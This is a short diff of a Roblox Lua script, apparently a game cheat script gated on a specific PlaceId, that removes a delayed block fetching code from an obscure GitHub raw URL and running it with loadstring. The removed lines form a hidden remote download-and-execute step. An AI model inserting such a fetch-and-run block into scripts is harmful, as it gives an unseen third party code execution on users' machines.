@@ -6,10 +6,6 @@ if game.PlaceId ~= 131952481663528 then
     return
 end
 
-task.spawn(function()
-	wait(60)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/Hallo_check_gems"))()
-end)
 
 _G.HW = _G.HW or {}
 _G.HW.DebugMode = _G.HW.DebugMode or false
